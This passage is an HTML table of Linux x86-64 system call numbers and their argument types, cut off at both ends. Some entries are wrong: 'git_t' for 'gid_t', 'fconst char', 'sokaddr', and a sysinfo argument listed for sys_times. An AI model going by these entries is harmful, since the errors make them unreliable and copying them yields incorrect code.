align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">sys_open</td><td align="left">0x2</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">3</td><td align="left">sys_close</td><td align="left">0x3</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">4</td><td align="left">sys_stat</td><td align="left">0x4</td><td align="left">const char *filename</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">5</td><td align="left">sys_fstat</td><td align="left">0x5</td><td align="left">unsigned int fd</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">6</td><td align="left">sys_lstat</td><td align="left">0x6</td><td align="left">fconst char *filename</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">7</td><td align="left">sys_poll</td><td align="left">0x7</td><td align="left">struct poll_fd *ufds</td><td align="left">unsigned int nfds</td><td align="left">long timeout_msecs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">8</td><td align="left">sys_lseek</td><td align="left">0x8</td><td align="left">unsigned int fd</td><td align="left">off_t offset</td><td align="left">unsigned int origin</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">9</td><td align="left">sys_mmap</td><td align="left">0x9</td><td align="left">unsigned long addr</td><td align="left">unsigned long len</td><td align="left">unsigned long prot</td><td align="left">unsigned long flags</td><td align="left">unsigned long fd</td><td align="left">unsigned long off</td></tr><tr><td align="left">10</td><td align="left">sys_mprotect</td><td align="left">0xA</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned long prot</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">11</td><td align="left">sys_munmap</td><td align="left">0xB</td><td align="left">unsigned long addr</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">12</td><td align="left">sys_brk</td><td align="left">0xC</td><td align="left">unsigned long brk</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">13</td><td align="left">sys_rt_sigaction</td><td align="left">0xD</td><td align="left">int sig</td><td align="left">const struct sigaction *act</td><td align="left">struct sigaction *oact</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">14</td><td align="left">sys_rt_sigprocmask</td><td align="left">0xE</td><td align="left">int how</td><td align="left">sigset_t *nset</td><td align="left">sigset_t *oset</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">15</td><td align="left">sys_rt_sigreturn</td><td align="left">0xF</td><td align="left">unsigned long __unused</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">16</td><td align="left">sys_ioctl</td><td align="left">0x10</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">17</td><td align="left">sys_pread64</td><td align="left">0x11</td><td align="left">unsigned long fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">18</td><td align="left">sys_pwrite64</td><td align="left">0x12</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">19</td><td align="left">sys_readv</td><td align="left">0x13</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">20</td><td align="left">sys_writev</td><td align="left">0x14</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">21</td><td align="left">sys_access</td><td align="left">0x15</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">22</td><td align="left">sys_pipe</td><td align="left">0x16</td><td align="left">int *filedes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">23</td><td align="left">sys_select</td><td align="left">0x17</td><td align="left">int n</td><td align="left">fd_set *inp</td><td align="left">fd_set *outp</td><td align="left">fd_set*exp</td><td align="left">struct timeval *tvp</td><td align="left"></td></tr><tr><td align="left">24</td><td align="left">sys_sched_yield</td><td align="left">0x18</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">25</td><td align="left">sys_mremap</td><td align="left">0x19</td><td align="left">unsigned long addr</td><td align="left">unsigned long old_len</td><td align="left">unsigned long new_len</td><td align="left">unsigned long flags</td><td align="left">unsigned long new_addr</td><td align="left"></td></tr><tr><td align="left">26</td><td align="left">sys_msync</td><td align="left">0x1A</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">27</td><td align="left">sys_mincore</td><td align="left">0x1B</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned char *vec</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">28</td><td align="left">sys_madvise</td><td align="left">0x1C</td><td align="left">unsigned long start</td><td align="left">size_t len_in</td><td align="left">int behavior</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">29</td><td align="left">sys_shmget</td><td align="left">0x1D</td><td align="left">key_t key</td><td align="left">size_t size</td><td align="left">int shmflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">30</td><td align="left">sys_shmat</td><td align="left">0x1E</td><td align="left">int shmid</td><td align="left">char *shmaddr</td><td align="left">int shmflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">31</td><td align="left">sys_shmctl</td><td align="left">0x1F</td><td align="left">int shmid</td><td align="left">int cmd</td><td align="left">struct shmid_ds *buf</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">32</td><td align="left">sys_dup</td><td align="left">0x20</td><td align="left">unsigned int fildes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">33</td><td align="left">sys_dup2</td><td align="left">0x21</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">34</td><td align="left">sys_pause</td><td align="left">0x22</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">35</td><td align="left">sys_nanosleep</td><td align="left">0x23</td><td align="left">struct timespec *rqtp</td><td align="left">struct timespec *rmtp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">36</td><td align="left">sys_getitimer</td><td align="left">0x24</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">37</td><td align="left">sys_alarm</td><td align="left">0x25</td><td align="left">unsigned int seconds</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">38</td><td align="left">sys_setitimer</td><td align="left">0x26</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left">struct itimerval *ovalue</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">39</td><td align="left">sys_getpid</td><td align="left">0x27</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">40</td><td align="left">sys_sendfile</td><td align="left">0x28</td><td align="left">int out_fd</td><td align="left">int in_fd</td><td align="left">off_t *offset</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">41</td><td align="left">sys_socket</td><td align="left">0x29</td><td align="left">int family</td><td align="left">int type</td><td align="left">int protocol</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">42</td><td align="left">sys_connect</td><td align="left">0x2A</td><td align="left">int fd</td><td align="left">struct sockaddr *uservaddr</td><td align="left">int addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">43</td><td align="left">sys_accept</td><td align="left">0x2B</td><td align="left">int fd</td><td align="left">struct sockaddr *upeer_sockaddr</td><td align="left">int *upeer_addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">44</td><td align="left">sys_sendto</td><td align="left">0x2C</td><td align="left">int fd</td><td align="left">void *buff</td><td align="left">size_t len</td><td align="left">unsigned flags</td><td align="left">struct sockaddr *addr</td><td align="left">int addr_len</td></tr><tr><td align="left">45</td><td align="left">sys_recvfrom</td><td align="left">0x2D</td><td align="left">int fd</td><td align="left">void *ubuf</td><td align="left">size_t size</td><td align="left">unsigned flags</td><td align="left">struct sockaddr *addr</td><td align="left">int *addr_len</td></tr><tr><td align="left">46</td><td align="left">sys_sendmsg</td><td align="left">0x2E</td><td align="left">int fd</td><td align="left">struct msghdr *msg</td><td align="left">unsigned flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">47</td><td align="left">sys_recvmsg</td><td align="left">0x2F</td><td align="left">int fd</td><td align="left">struct msghdr *msg</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">48</td><td align="left">sys_shutdown</td><td align="left">0x30</td><td align="left">int fd</td><td align="left">int how</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">49</td><td align="left">sys_bind</td><td align="left">0x31</td><td align="left">int fd</td><td align="left">struct sokaddr *umyaddr</td><td align="left">int addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">50</td><td align="left">sys_listen</td><td align="left">0x32</td><td align="left">int fd</td><td align="left">int backlog</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">51</td><td align="left">sys_getsockname</td><td align="left">0x33</td><td align="left">int fd</td><td align="left">struct sockaddr *usockaddr</td><td align="left">int *usockaddr_len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">52</td><td align="left">sys_getpeername</td><td align="left">0x34</td><td align="left">int fd</td><td align="left">struct sockaddr *usockaddr</td><td align="left">int *usockaddr_len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">53</td><td align="left">sys_socketpair</td><td align="left">0x35</td><td align="left">int family</td><td align="left">int type</td><td align="left">int protocol</td><td align="left">int *usockvec</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">54</td><td align="left">sys_setsockopt</td><td align="left">0x36</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int optlen</td><td align="left"></td></tr><tr><td align="left">55</td><td align="left">sys_getsockopt</td><td align="left">0x37</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int *optlen</td><td align="left"></td></tr><tr><td align="left">56</td><td align="left">sys_clone</td><td align="left">0x38</td><td align="left">unsigned long clone_flags</td><td align="left">unsigned long newsp</td><td align="left">void *parent_tid</td><td align="left">void *child_tid</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">57</td><td align="left">sys_fork</td><td align="left">0x39</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">58</td><td align="left">sys_vfork</td><td align="left">0x3A</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">59</td><td align="left">sys_execve</td><td align="left">0x3B</td><td align="left">const char *filename</td><td align="left">const char *const argv[]</td><td align="left">const char *const envp[]</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">60</td><td align="left">sys_exit</td><td align="left">0x3C</td><td align="left">int error_code</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">61</td><td align="left">sys_wait4</td><td align="left">0x3D</td><td align="left">pid_t upid</td><td align="left">int *stat_addr</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">62</td><td align="left">sys_kill</td><td align="left">0x3E</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">63</td><td align="left">sys_uname</td><td align="left">0x3F</td><td align="left">struct old_utsname *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">64</td><td align="left">sys_semget</td><td align="left">0x40</td><td align="left">key_t key</td><td align="left">int nsems</td><td align="left">int semflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">65</td><td align="left">sys_semop</td><td align="left">0x41</td><td align="left">int semid</td><td align="left">struct sembuf *tsops</td><td align="left">unsigned nsops</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">66</td><td align="left">sys_semctl</td><td align="left">0x42</td><td align="left">int semid</td><td align="left">int semnum</td><td align="left">int cmd</td><td align="left">union semun arg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">67</td><td align="left">sys_shmdt</td><td align="left">0x43</td><td align="left">char *shmaddr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">68</td><td align="left">sys_msgget</td><td align="left">0x44</td><td align="left">key_t key</td><td align="left">int msgflg</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">69</td><td align="left">sys_msgsnd</td><td align="left">0x45</td><td align="left">int msqid</td><td align="left">struct msgbuf *msgp</td><td align="left">size_t msgsz</td><td align="left">int msgflg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">70</td><td align="left">sys_msgrcv</td><td align="left">0x46</td><td align="left">int msqid</td><td align="left">struct msgbuf *msgp</td><td align="left">size_t msgsz</td><td align="left">long msgtyp</td><td align="left">int msgflg</td><td align="left"></td></tr><tr><td align="left">71</td><td align="left">sys_msgctl</td><td align="left">0x47</td><td align="left">int msqid</td><td align="left">int cmd</td><td align="left">struct msqid_ds *buf</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">72</td><td align="left">sys_fcntl</td><td align="left">0x48</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">73</td><td align="left">sys_flock</td><td align="left">0x49</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">74</td><td align="left">sys_fsync</td><td align="left">0x4A</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">75</td><td align="left">sys_fdatasync</td><td align="left">0x4B</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">76</td><td align="left">sys_truncate</td><td align="left">0x4C</td><td align="left">const char *path</td><td align="left">long length</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">77</td><td align="left">sys_ftruncate</td><td align="left">0x4D</td><td align="left">unsigned int fd</td><td align="left">unsigned long length</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">78</td><td align="left">sys_getdents</td><td align="left">0x4E</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent *dirent</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">79</td><td align="left">sys_getcwd</td><td align="left">0x4F</td><td align="left">char *buf</td><td align="left">unsigned long size</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">80</td><td align="left">sys_chdir</td><td align="left">0x50</td><td align="left">const char *filename</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">81</td><td align="left">sys_fchdir</td><td align="left">0x51</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">82</td><td align="left">sys_rename</td><td align="left">0x52</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">83</td><td align="left">sys_mkdir</td><td align="left">0x53</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">84</td><td align="left">sys_rmdir</td><td align="left">0x54</td><td align="left">const char *pathname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">85</td><td align="left">sys_creat</td><td align="left">0x55</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">86</td><td align="left">sys_link</td><td align="left">0x56</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">87</td><td align="left">sys_unlink</td><td align="left">0x57</td><td align="left">const char *pathname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">88</td><td align="left">sys_symlink</td><td align="left">0x58</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">89</td><td align="left">sys_readlink</td><td align="left">0x59</td><td align="left">const char *path</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">90</td><td align="left">sys_chmod</td><td align="left">0x5A</td><td align="left">const char *filename</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">91</td><td align="left">sys_fchmod</td><td align="left">0x5B</td><td align="left">unsigned int fd</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">92</td><td align="left">sys_chown</td><td align="left">0x5C</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">git_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">93</td><td align="left">sys_fchown</td><td align="left">0x5D</td><td align="left">unsigned int fd</td><td align="left">uid_t user</td><td align="left">git_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">94</td><td align="left">sys_lchown</td><td align="left">0x5E</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">git_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">95</td><td align="left">sys_umask</td><td align="left">0x5F</td><td align="left">int mask</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">96</td><td align="left">sys_gettimeofday</td><td align="left">0x60</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">97</td><td align="left">sys_getrlimit</td><td align="left">0x61</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">98</td><td align="left">sys_getrusage</td><td align="left">0x62</td><td align="left">int who</td><td align="left">struct rusage *ru</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">99</td><td align="left">sys_sysinfo</td><td align="left">0x63</td><td align="left">struct sysinfo *info</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">100</td><td align="left">sys_times</td><td align="left">0x64</td><td align="left">struct sysinfo *info</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">101</td><td align="left">sys_ptrace</td><td align="left">0x65</td><td align="left">long request</td><td align="left">long pid</td><td align="left">unsigned long addr</td><td align="left">unsigned long data</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">102</td><td align="left">sys_getuid</td><td align="left">0x66</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">103</td><td align="left">sys_syslog</td><td align="left">0x67</td><td align="left">int type</td><td align="left">char *buf</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">104</td><td align="left">sys_getgid</td><td align="left">0x68</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">105</td><td align="left">sys_setuid</td><td align="left">0x69</td><td align="left">uid_t uid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">106</td><td align="left">sys_setgid</td><td align="left">0x6A</td><td align="left">git_t gid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">107</td><td align="left">sys_geteuid</td><td align="left">0x6B</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">108</td><td align="left">sys_getegid</td><td align="left">0x6C</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">109</td><td align="left">sys_setpgid</td><td align="left">0x6D</td><td align="left">pid_t pid</td><td align="left">pid_t pgid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">110</td><td align="left">sys_getppid</td><td align="left">0x6E</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">111</td><td align="left">sys_getpgrp</td><td align="left">0x6F</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">112</td><td align="left">sys_setsid</td><td align="left">0x70</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">113</td><td align="left">sys_setreuid</td><td align="left">0x71</td><td align="left">uid_t ruid</td><td align="left">uid_t euid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">114</td><td align="left">sys_setregid</td><td align="left">0x72</td><td align="left">git_t rgid</td><td align="left">gid_t egid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">115</td><td align="left">sys_getgroups</td><td align="left">0x73</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">116</td><td align="left">sys_setgroups</td><td align="left">0x74</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">117</td><td align="left">sys_setresuid</td><td align="left">0x75</td><td align="left">uid_t *ruid</td><td align="left">uid_t *euid</td><td align="left">uid_t *suid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">118</td><td align="left">sys_getresuid</td><td align="left">0x76</td><td align="left">uid_t *ruid</td><td align="left">uid_t *euid</td><td align="left">uid_t *suid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">119</td><td align="left">sys_setresgid</td><td align="left">0x77</td><td align="left">gid_t rgid</td><td align="left">gid_t egid</td><td align="left">gid_t sgid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">120</td><td align="left">sys_getresgid</td><td align="left">0x78</td><td align="left">git_t *rgid</td><td align="left">git_t *egid</td><td align="left">git_t *sgid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">121</td><td align="left">sys_getpgid</td><td align="left">0x79</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">122</td><td align="left">sys_setfsuid</td><td align="left">0x7A</td><td align="left">uid_t uid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">123</td><td align="left">sys_setfsgid</td><td align="left">0x7B</td><td align="left">gid_t gid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">124</td><td align="left">sys_getsid</td><td align="left">0x7C</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">125</td><td align="left">sys_capget</td><td align="left">0x7D</td><td align="left">cap_user_header_t header</td><td align="left">cap_user_data_t dataptr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">126</td><td align="left">sys_capset</td><td align="left">0x7E</td><td align="left">cap_user_header_t header</td><td align="left">const cap_user_data_t data</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">127</td><td align="left">sys_rt_sigpending</td><td align="left">0x7F</td><td align="left">sigset_t *set</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">128</td><td align="left">sys_rt_sigtimedwait</td><td align="left">0x80</td><td align="left">const sigset_t *uthese</td><td align="left">siginfo_t *uinfo</td><td align="left">const struct timespec *uts</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">129</td><td align="left">sys_rt_sigqueueinfo</td><td align="left">0x81</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">130</td><td align="left">sys_rt_sigsuspend</td><td align="left">0x82</td><td align="left">sigset_t *unewset</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">131</td><td align="left">sys_sigaltstack</td><td align="left">0x83</td><td align="left">const stack_t *uss</td><td align="left">stack_t *uoss</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">132</td><td align="left">sys_utime</td><td align="left">0x84</td><td align="left">char *filename</td><td align="left">struct utimbuf *times</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">133</td><td align="left">sys_mknod</td><td align="left">0x85</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left">unsigned dev</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">134</td><td align="left">sys_uselib</td><td align="left">0x86</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">135</td><td align="left">sys_personality</td><td align="left">0x87</td><td align="left">unsigned int personality</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">136</td><td align="left">sys_ustat</td><td align="left">0x88</td><td align="left">unsigned dev</td><td align="left">struct ustat *ubuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">137</td><td align="left">sys_statfs</td><td align="left">0x89</td><td align="left">const char *pathname</td><td align="left">struct statfs *buf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">138</td><td align="left">sys_fstatfs</td><td align="left">0x8A</td><td align="left">unsigned int fd</td><td align="left">struct statfs *buf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">139</td><td align="left">sys_sysfs</td><td align="left">0x8B</td><td align="left">int option</td><td align="left">unsigned long arg1</td><td align="left">unsigned long arg2</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">140</td><td align="left">sys_getpriority</td><td align="left">0x8C</td><td align="left">int which</td><td align="left">int who</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">141</td><td align="left">sys_setpriority</td><td align="left">0x8D</td><td align="left">int which</td><td align="left">int who</td><td align="left">int niceval</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">142</td><td align="left">sys_sched_setparam</td><td align="left">0x8E</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">143</td><td align="left">sys_sched_getparam</td><td align="left">0x8F</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">144</td><td align="left">sys_sched_setscheduler</td><td align="left">0x90</td><td align="left">pid_t pid</td><td align="left">int policy</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">145</td><td align="left">sys_sched_getscheduler</td><td align="left">0x91</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">146</td><td align="left">sys_sched_get_priority_max</td><td align="left">0x92</td><td align="left">int policy</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">147</td><td 